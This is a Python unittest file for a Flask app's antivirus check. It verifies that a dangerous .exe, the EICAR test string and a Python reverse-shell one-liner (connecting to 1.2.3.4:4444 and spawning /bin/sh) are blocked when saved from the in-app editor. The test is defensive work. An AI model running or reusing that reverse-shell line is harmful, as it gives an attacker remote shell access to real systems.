"""El antivirus también revisa lo que se crea o escribe dentro del editor de Trabajo (no solo lo que se sube)."""
import unittest

from flask import g

import utilidades
from app import create_app
from models import Incidente, db

EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


class AntivirusEditorTest(unittest.TestCase):
    def setUp(self):
        utilidades._RATE_LIMITS.clear()
        self.app = create_app({"TESTING": True, "SECRET_KEY": "x", "SQLALCHEMY_DATABASE_URI": "sqlite://", "SESSION_COOKIE_SECURE": False,
                               "GOOGLE_CLIENT_ID": "", "GOOGLE_CLIENT_SECRET": ""})
        self.ctx = self.app.app_context(); self.ctx.push(); db.create_all()
        self.c = self.app.test_client()
        self.c.get("/api/auth/me/")
        self.h = {"X-CSRFToken": self.c.get_cookie("csrftoken").value}
        self.c.post("/api/auth/register/", json={"nombre": "Ana", "email": "ana@example.com", "password": "Clave123"}, headers=self.h)

    def tearDown(self):
        db.session.remove(); db.drop_all(); db.engine.dispose(); self.ctx.pop()

    def guardar(self, files):
        g.pop("_login_user", None)
        r = self.c.put("/api/trabajo/", json={"files": files, "folders": [], "git": {}}, headers=self.h)
        self.assertEqual(r.status_code, 200, r.get_json())
        return r.get_json()

    def test_archivo_peligroso_creado_en_el_editor_no_se_guarda(self):
        r = self.guardar({"index.html": "<h1>Hola</h1>", "preuba.exe": "hola", "eicar.txt": EICAR,
                          "x.py": 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'})
        self.assertEqual(sorted(b["ruta"] for b in r["bloqueados"]), ["eicar.txt", "preuba.exe", "x.py"])
        g.pop("_login_user", None)
        guardado = self.c.get("/api/trabajo/").get_json()["proyecto"]["files"]
        self.assertEqual(list(guardado), ["index.html"], "lo peligroso no llega al servidor")
        self.assertEqual(Incidente.query.count(), 3, "una falta por archivo, con correo y aviso en el panel")
        # El autoguardado vuelve a mandarlo: no se repite la falta
        self.guardar({"index.html": "<h1>Hola</h1>", "preuba.exe": "hola"})
        self.assertEqual(Incidente.query.count(), 3)

    def test_codigo_normal_no_se_bloquea(self):
        r = self.guardar({"main.py": "print('hola')", "bin/app.exe": "compilado", "script.sh": "echo hola"})
        self.assertEqual(r["bloqueados"], [])
        self.assertEqual(Incidente.query.count(), 0)


if __name__ == "__main__":
    unittest.main()
